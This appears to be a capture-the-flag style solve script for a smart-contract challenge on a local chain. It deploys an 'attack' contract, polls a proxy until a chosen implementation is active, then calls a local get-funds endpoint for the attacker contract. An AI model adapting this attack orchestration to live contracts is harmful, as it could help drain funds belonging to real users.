
forge script --chain sepolia --rpc-url http://127.0.0.1:8080/rpc --broadcast -vvvv script/DeployAttack.s.sol
target_active="0x000000000000000000000000e5ed47bcc12028b9be183a80b8821119e9397ef7"
attacker_contract=$(cat broadcast/DeployAttack.s.sol/31337/run-latest.json | jq '.transactions[0].contractAddress' | tr -d '"')
echo "attacking with $attacker_contract"
while [ 1 -eq 1 ]
do
    current_active=$(cast call 0xe6cc6358e23fcb274c0e0696d6f9635bd9f223b1  "getImplementation1599d()" --rpc-url http://localhost:8080/rpc)
    echo "Currently Active:$current_active"
    if [ "$current_active" == "$target_active" ]; then
        echo "Attacking"
        sleep 5
        curl http://localhost:8080/get-funds -H "Content-Type: application/json" -d "{\"address\":\"$attacker_contract\"}"
        exit 0
    else
        echo "Not Attacking"
    fi
    sleep 1
done